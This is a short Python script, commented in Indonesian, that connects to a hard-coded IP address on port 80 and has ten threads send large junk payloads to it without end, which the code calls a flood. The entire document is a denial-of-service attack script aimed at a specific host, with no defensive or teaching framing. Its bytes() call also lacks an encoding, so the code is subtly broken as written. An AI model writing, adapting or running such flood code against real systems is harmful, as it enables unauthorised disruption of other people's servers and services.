import socket
import threading

# Konfigurasi
TARGET_IP = "143.198.206.18"  # IP tujuan
PORT = 80  # Port tujuan
PACKET_SIZE = 99999  # Ukuran paket

# Fungsi untuk mengirim paket
def send_packets(sock):
    while True:
        data = bytes("A" * PACKET_SIZE)  # Isi paket
        sock.send(data)

# Fungsi untuk menjalankan thread pengiriman paket
def start_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, PORT))

    threads = []

    for _ in range(10):  # Jalankan 10 thread
        thread = threading.Thread(target=send_packets, args=(sock,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Jalankan flood
start_flood()
